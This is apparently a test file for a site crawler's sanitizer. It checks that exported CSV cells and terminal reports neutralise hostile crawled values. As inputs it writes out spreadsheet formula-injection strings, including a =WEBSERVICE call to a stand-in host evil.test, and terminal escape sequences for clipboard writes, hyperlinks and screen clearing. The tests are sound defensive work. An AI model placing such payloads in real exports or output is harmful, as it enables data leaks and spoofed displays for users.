import { describe, it, expect, vi, afterEach } from 'vitest';
import { csvSafeCell, csvSafeRecord, termSafe, termSafeLines } from './sanitize.js';
import { flattenPageForCsv } from './writer.js';
import { printDiffReport } from './diff-report.js';
import { generateReport, printReport } from './reporter.js';
import { analyzeUrlStructure } from './url-structure.js';
import { extractPageData } from './extractor.js';
import { validateStructuredData } from './schema-validator.js';
import type { DiffResult, PageData } from './types.js';

const ESC = String.fromCharCode(27);
const BEL = String.fromCharCode(7);
const OSC52 = `${ESC}]52;c;ZXZpbA==${BEL}`; // clipboard write
const OSC8 = `${ESC}]8;;https://evil.test${ESC}\\`; // hyperlink
const CSI = `${ESC}[2J${ESC}[31m`; // clear screen + red
const RLO = String.fromCharCode(0x202e); // right-to-left override
const C1_CSI = String.fromCharCode(0x9b);

/** True when s still holds a terminal control character. */
// eslint-disable-next-line no-control-regex
const hasControl = (s: string) => /[\x00-\x09\x0b-\x1f\x7f-\x9f\u202a-\u202e\u2066-\u2069]/.test(s);

describe('csvSafeCell', () => {
  it('prefixes formula-like strings with an apostrophe', () => {
    for (const v of ['=HYPERLINK("http://evil")', '+cmd', '-2+3', '@SUM(A1)', '\t=1', '\r=1', '  =1']) {
      expect(csvSafeCell(v)).toBe(`'${v}`);
    }
  });

  it('keeps plain text, numbers, booleans and numeric strings as they are', () => {
    expect(csvSafeCell('Hello = world')).toBe('Hello = world');
    expect(csvSafeCell('')).toBe('');
    expect(csvSafeCell(42)).toBe(42);
    expect(csvSafeCell(-3)).toBe(-3);
    expect(csvSafeCell(true)).toBe(true);
    expect(csvSafeCell('-12.5')).toBe('-12.5');
    expect(csvSafeCell('+1')).toBe('+1');
    expect(csvSafeCell('-12.5%')).toBe('-12.5%');
  });

  it('sanitizes keys and values of a record', () => {
    expect(csvSafeRecord({ '=k': '=v', n: 1 })).toEqual({ "'=k": "'=v", n: 1 });
  });
});

describe('flattenPageForCsv (CLI --csv and dashboard export)', () => {
  const page = {
    url: 'https://a.test/', finalUrl: 'https://a.test/', statusCode: 200, redirectChain: [],
    title: { text: '=WEBSERVICE("https://evil.test/?"&A1)', length: 10 },
    metaDescription: { text: '+SUM(1)', length: 7 },
    headings: { h1: ['@cmd'], h2: [] }, internalLinks: [], externalLinks: [], images: [], hreflang: [],
    structuredData: [], openGraph: { 'og:title': '-1+1' }, twitterCard: {}, anchors: [],
    security: {}, customExtractions: { price: ['=1+1'] }, customSearches: {}, snippetResults: { s: '=x' },
    segments: [], aiAnalysis: '=IMPORTXML(1)', error: '-oops', responseTimeMs: 12, depth: 0,
    wordCount: 100, canonicalCount: 0,
  } as unknown as PageData;

  it('neutralizes formula cells from crawled content and keeps numbers numeric', () => {
    const row = flattenPageForCsv(page);
    expect(row.title).toBe(`'=WEBSERVICE("https://evil.test/?"&A1)`);
    expect(row.meta_description).toBe("'+SUM(1)");
    expect(row.h1_text).toBe("'@cmd");
    expect(row.og_title).toBe("'-1+1");
    expect(row.extract_price).toBe("'=1+1");
    expect(row.snippet_s).toBe("'=x");
    expect(row.ai_analysis).toBe("'=IMPORTXML(1)");
    expect(row.error).toBe("'-oops");
    expect(row.status_code).toBe(200);
    expect(row.response_time_ms).toBe(12);
    expect(row.word_count).toBe(100);
    expect(row.url).toBe('https://a.test/');
  });
});

describe('termSafe', () => {
  it('strips OSC, CSI, C1, bidi and other control characters', () => {
    const out = termSafe(`A${OSC52}B${OSC8}C${CSI}D${RLO}E${C1_CSI}F${BEL}G`);
    expect(out).toBe('ABCDEFG');
  });

  it('turns line breaks into spaces so a value cannot forge report lines', () => {
    expect(termSafe('a\nb\r\nc\td')).toBe('a b c d');
  });

  it('leaves normal text, including non-Latin scripts, unchanged', () => {
    const s = 'Caf\u00e9 — \u00dcn\u00efc\u00f6d\u00e9 \u65e5\u672c\u8a9e \u0627\u0644\u0639\u0631\u0628\u064a\u0629';
    expect(termSafe(s)).toBe(s);
  });

  it('termSafeLines keeps line feeds but removes everything else', () => {
    expect(termSafeLines(`\n  Title: x${CSI}y\n`)).toBe('\n  Title: xy\n');
  });
});

describe('terminal reports sanitize crawled values', () => {
  afterEach(() => vi.restoreAllMocks());

  const captureLog = () => {
    const lines: string[] = [];
    vi.spyOn(console, 'log').mockImplementation((...a: unknown[]) => { lines.push(a.map(String).join(' ')); });
    return lines;
  };

  it('printDiffReport strips escapes from URLs and old/new values', () => {
    const lines = captureLog();
    const result = {
      oldFile: 'a.jsonl', newFile: 'b.jsonl', oldCount: 1, newCount: 1,
      addedUrls: [`https://a.test/${OSC52}`], removedUrls: [`https://a.test/r${CSI}`],
      changedUrls: [{
        url: `https://a.test/c${OSC8}`,
        changes: [{ field: 'title', oldValue: `old${OSC52}`, newValue: `new\n${CSI}FAKE LINE` }],
      }],
      unchangedCount: 0, urlMappingsApplied: 0, fieldSummary: { title: 1 },
    } as unknown as DiffResult;
    printDiffReport(result);
    const out = lines.join('\n');
    expect(out).toContain('https://a.test/');
    expect(hasControl(out)).toBe(false);
    expect(out).not.toMatch(/\n\s*FAKE LINE/);
  });

  it('printReport strips escapes from schema types, validation messages and query keys', () => {
    const jsonLd = JSON.stringify({ '@type': `Product${OSC52}`, '@context': `https://evil.test/${CSI}` });
    const key = encodeURIComponent(`k${ESC}]52;c;eA==${BEL}`);
    const pages = [1, 2].map((i) => {
      const url = `https://a.test/p?${key}=1&n=${i}`;
      const html = `<html><head><title>T${i}</title><script type="application/ld+json">${jsonLd}</script></head><body><h1>x</h1></body></html>`;
      const page = extractPageData({
        url, finalUrl: url, statusCode: 200, redirectChain: [], headers: {}, html,
        contentType: 'text/html', responseTimeMs: 5, transferSize: html.length,
      }, 0, 'a.test');
      page.urlStructure = analyzeUrlStructure(url);
      page.schemaValidation = validateStructuredData(page.structuredData);
      return page;
    });
    const lines = captureLog();
    printReport(generateReport(pages, 1000));
    const out = lines.join('\n');
    expect(out).toContain('Schema types found');
    expect(out).toContain('Top Query Parameters');
    expect(out).toMatch(/Product\]52;c;ZXZpbA==|Product/);
    expect(hasControl(out)).toBe(false);
  });
});
